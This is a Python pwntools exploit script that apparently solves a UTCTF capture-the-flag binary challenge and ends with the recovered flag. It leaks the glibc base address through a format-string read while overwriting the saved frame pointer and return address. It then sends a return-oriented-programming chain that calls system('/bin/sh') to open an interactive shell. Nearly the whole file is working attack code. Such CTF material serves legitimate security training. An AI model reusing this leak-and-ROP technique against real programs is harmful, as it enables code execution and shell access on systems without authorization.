from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./shellcode_patched', '''
    b *(main+33)
    b *(main+270)
    continue
''')

# p = remote('challenge.utctf.live', 9009)

# 1. leak glibc base address with fmtstr
# from <main+00f0> to <main+00f7) (0x400706-0x40070d): mov rax, QWORD PTR [rbp-0x10]; add rax, rdx; movzx eax, BYTE PTR [rax];
# ensuring rdx=0 within these instructions, qword data at rbp-0x10 has to be an available address
FAKE_RBP_MINUS_HEX_10 = 0x601800
MAIN_USABLE = 0x400617
p.sendlineafter(b"<Insert prompt here>: \n", b'%3$p'+b'\0'*(0x30-4)+p64(FAKE_RBP_MINUS_HEX_10)+b'\0'*0x10+p64(MAIN_USABLE))
glibc_base_addr = int(p.recv(14), 16)-0x3c48e0
log.info(f"glibc base addr: {hex(glibc_base_addr)}")

# 2. ROP to pop a shell
glibc_e = ELF('./libc.so.6')
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
# same as above, qword data at rbp-0x10 has to be an available address
p.sendlineafter(b'<Insert prompt here>: \n', b'\0'*0x30+p64(FAKE_RBP_MINUS_HEX_10)+b'\0'*0x10+b''.join([p64(c) for c in chain]))

p.interactive()

# utflag{i_should_be_doing_ccdc_rn}